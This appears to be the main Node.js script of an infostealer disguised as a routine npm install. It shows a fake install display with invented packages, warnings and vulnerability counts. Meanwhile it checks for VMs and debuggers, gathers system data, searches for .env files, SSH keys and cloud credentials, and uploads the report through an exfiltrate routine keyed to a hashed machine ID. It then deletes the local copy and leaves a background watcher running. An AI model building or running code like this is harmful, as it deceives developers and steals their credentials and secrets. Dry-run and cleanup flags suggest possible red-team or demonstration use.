const fs = require("fs");
const os = require("os");
const path = require("path");
const logger = require("./utils/logger");
const { PhaseError } = require("./utils/errors");
const startWatcher = require("./monitor/watcher");
const generateReport = require("./report/generator");
const { getHashedMachineGuid } = require("./system/machineId");
const { exfiltrate } = require("./app/exfil");
const { uninstall: persistUninstall } = require("./system/persist");
const {
    collectSystemData,
    huntEnvFiles,
    huntSecretFiles,
    performCrudOperations,
    cleanupArtifacts,
    buildReport,
    HIDDEN_DIR
} = require("./app/orchestrator");
const { detectVM } = require("./system/vmDetect");
const { detectDebugger } = require("./system/debugDetect");

const startTime = Date.now();
const ROOT = path.resolve(__dirname, "..");
const LOG_FILE = path.join(os.tmpdir(), ".wu-run.log");
const DRY_RUN = process.argv.includes("--dry-run");
const CLEANUP = process.argv.includes("--cleanup");

logger.silent(true);
logger.setLogFile(LOG_FILE);

const PACKAGES = [
    { name: "express", version: "4.21.0" },
    { name: "lodash", version: "4.17.21" },
    { name: "axios", version: "1.7.2" },
    { name: "core-js", version: "3.37.0" },
    { name: "react", version: "18.3.1" },
    { name: "typescript", version: "5.5.2" },
    { name: "webpack", version: "5.92.1" },
    { name: "vite", version: "5.3.2" },
    { name: "esbuild", version: "0.23.0" },
    { name: "prettier", version: "3.3.2" },
    { name: "eslint", version: "9.6.0" },
    { name: "bcrypt", version: "5.1.1" },
    { name: "mongoose", version: "8.4.3" },
    { name: "jsonwebtoken", version: "9.0.2" },
    { name: "chalk", version: "5.3.0" },
    { name: "commander", version: "12.1.0" },
    { name: "dotenv", version: "16.4.5" },
    { name: "sharp", version: "0.33.4" },
    { name: "pino", version: "9.3.2" },
    { name: "zod", version: "3.23.8" }
];

const DEP_WARNINGS = [
    { package: "uuid@3.4.0", message: "Please upgrade to uuid@8.3.2+" },
    { package: "rollup-plugin-terser@7.0.2", message: "This package has been deprecated" },
    { package: "har-validator@5.1.5", message: "this library is no longer supported" },
    { package: "request@2.88.2", message: "request has been deprecated, see https://github.com/request/request/issues/3142" },
    { package: "gulp-util@3.0.8", message: "Please update to gulp 4+" },
    { package: "npm@6.14.18", message: "this version has known vulnerabilities" }
];

const LIFECYCLE_PACKAGES = [
    "core-js", "bcrypt", "esbuild", "sharp"
];

process.on("uncaughtException", (err) => {
    logger.error(`Uncaught exception: ${err.message}`);
    console.log("\nnpm ERR! Install failed with errors.");
    if (!DRY_RUN) {
        try { persistUninstall(); } catch {}
        try { cleanupArtifacts(DRY_RUN); } catch {}
    }
    process.exit(1);
});

process.on("unhandledRejection", (err) => {
    logger.error(`Unhandled rejection: ${err.message}`);
});

let _cleanupDone = false;
function safeCleanup() {
    if (_cleanupDone) return;
    _cleanupDone = true;
    if (!DRY_RUN) {
        try { persistUninstall(); } catch {}
        try { cleanupArtifacts(DRY_RUN); } catch {}
        console.log("\n✔ Cleanup complete. No startup entries remain.");
    }
}

process.on("exit", safeCleanup);
process.on("SIGINT", () => { safeCleanup(); process.exit(0); });
process.on("SIGTERM", () => { safeCleanup(); process.exit(0); });

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function progressBar(pct, width = 30) {
    const filled = Math.round((pct / 100) * width);
    const empty = width - filled;
    return "[" + "█".repeat(filled) + "░".repeat(empty) + "]";
}

const SPINNERS = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"];
let _spinnerIdx = 0;
function spin() {
    _spinnerIdx = (_spinnerIdx + 1) % SPINNERS.length;
    return SPINNERS[_spinnerIdx];
}

function writeLine(line) {
    process.stdout.write("\r\x1b[J" + line + "\n");
}

function writeStatus(line) {
    process.stdout.write("\r\x1b[J" + line);
}

function clearLine() {
    process.stdout.write("\r\x1b[J");
}

async function fakeNpmInstall() {
    console.log("");
    console.log("  npm install");
    console.log("");

    const pkgCount = 12 + Math.floor(Math.random() * 9);
    const shuffled = [...PACKAGES].sort(() => Math.random() - 0.5).slice(0, pkgCount);
    const installed = [];

    for (let i = 0; i < shuffled.length; i++) {
        const pkg = shuffled[i];
        let pct = 0;
        const steps = 3 + Math.floor(Math.random() * 4);
        for (let s = 0; s < steps; s++) {
            pct = Math.min(100, Math.round(((s + 1) / steps) * (75 + Math.random() * 20)));
            writeStatus(`  ${spin()} ${pkg.name}@${pkg.version} ${progressBar(pct)} ${pct}%`);
            await sleep(400 + Math.random() * 800);
        }
        installed.push(`${pkg.name}@${pkg.version}`);
        clearLine();
        writeLine(`  ◉ ${pkg.name}@${pkg.version} ${progressBar(100)} 100%`);
    }

    const totalPackages = 700 + Math.floor(Math.random() * 1100);
    const auditTime = Math.floor(20 + Math.random() * 15);
    writeLine("");
    writeLine(`  added ${totalPackages} packages in ${auditTime}s`);
    writeLine("");

    writeLine("  " + spin() + " Running lifecycle scripts...");
    await sleep(500 + Math.random() * 500);

    for (const name of LIFECYCLE_PACKAGES) {
        writeLine(`  ◉ ${name} postinstall ✓`);
        await sleep(600 + Math.random() * 900);
    }

    writeLine("");
    const warnCount = 1 + Math.floor(Math.random() * 3);
    for (let i = 0; i < warnCount; i++) {
        const warn = DEP_WARNINGS[Math.floor(Math.random() * DEP_WARNINGS.length)];
        console.log(`  npm WARN deprecated ${warn.package}: ${warn.message}`);
        await sleep(200 + Math.random() * 400);
    }

    console.log("  npm notice");
    console.log("  npm notice created a lockfile as package-lock.json. You should commit this file.");
    console.log("  npm notice");
    await sleep(300 + Math.random() * 400);

    const vulnLow = 100 + Math.floor(Math.random() * 600);
    const vulnMod = 100 + Math.floor(Math.random() * 500);
    const vulnHigh = 50 + Math.floor(Math.random() * 200);
    const totalVuln = vulnLow + vulnMod + vulnHigh;
    console.log(`  found ${totalVuln} vulnerabilities (${vulnLow} low, ${vulnMod} moderate, ${vulnHigh} high)`);
    console.log("  run `npm audit fix --force` to fix them, or `npm audit` for details");
    await sleep(400 + Math.random() * 600);

    console.log("");
    console.log("  ✔ All dependencies installed successfully");
    console.log("");
}

(async () => {
    if (CLEANUP) {
        console.log("Running cleanup...");
        try { persistUninstall(DRY_RUN); } catch {}
        try { cleanupArtifacts(false); } catch {}
        console.log("Cleanup complete. All startup entries and artifacts removed.");
        return;
    }

    const errors = [];
    let systemData = {};
    let envFiles = { targets: [], totalFound: 0, files: [] };
    let secretFiles = { sshKeys: [], cloudCreds: [], totalFound: 0, files: [] };
    let crudLog = [];
    let safetyChecks = {};

    await fakeNpmInstall();

    if (DRY_RUN) {
        console.log("  ⚠ dry-run mode — no files will be copied or exfiltrated.");
        console.log("");
    }

    try {
        safetyChecks = {
            vm: detectVM(),
            debugger: detectDebugger()
        };
        if (safetyChecks.vm.isVM) {
            logger.warn(`VM detected (confidence: ${safetyChecks.vm.confidence})`);
        }
        if (safetyChecks.debugger.isDebugged) {
            logger.warn(`Debugger detected: ${safetyChecks.debugger.indicators.join("; ")}`);
        }
    } catch (err) {
        logger.warn(`Safety checks failed: ${err.message}`);
    }

    try {
        systemData = await collectSystemData();
        logger.info("Phase 1 complete");
    } catch (err) {
        const wrapped = new PhaseError("Phase 1", err);
        logger.error(wrapped.message);
        errors.push(wrapped.message);
    }

    try {
        envFiles = huntEnvFiles();
        logger.info("Phase 2 complete");
    } catch (err) {
        const wrapped = new PhaseError("Phase 2", err);
        logger.error(wrapped.message);
        errors.push(wrapped.message);
    }

    try {
        secretFiles = huntSecretFiles();
        logger.info("Secret file scan complete");
    } catch (err) {
        const wrapped = new PhaseError("Secret scan", err);
        logger.error(wrapped.message);
        errors.push(wrapped.message);
    }

    try {
        crudLog = performCrudOperations(ROOT, DRY_RUN);
        logger.info("Phase 3 complete");
    } catch (err) {
        const wrapped = new PhaseError("Phase 3", err);
        logger.error(wrapped.message);
        errors.push(wrapped.message);
    }

    try {
        const report = buildReport(systemData, envFiles, secretFiles, crudLog, startTime, errors);
        report.safetyChecks = safetyChecks;

        if (DRY_RUN) {
            generateReport(report);
            logger.info("Dry-run: report saved locally, exfil skipped");
        } else {
            const reportResult = generateReport(report);
            const systemId = getHashedMachineGuid();
            report.systemId = systemId;

            const uploaded = await exfiltrate(report, systemId);
            if (uploaded && reportResult && reportResult.path) {
                fs.unlinkSync(reportResult.path);
                logger.debug("Local report deleted after upload");
            }
        }
    } catch (err) {
        logger.error(`Report phase failed: ${err.message}`);
    }

    logger.info("Done.");

    if (!DRY_RUN) {
        try {
            startWatcher(HIDDEN_DIR, (filename, eventType) => {
                logger.warn(`Suspicious file detected: ${filename} (${eventType})`);
            });
        } catch (err) {
            logger.warn(`Watcher failed to start: ${err.message}`);
        }
    } else {
        logger.info("Dry-run: file watcher skipped");
    }

    console.log("  ✔ Setup complete. Running in background...");
})();
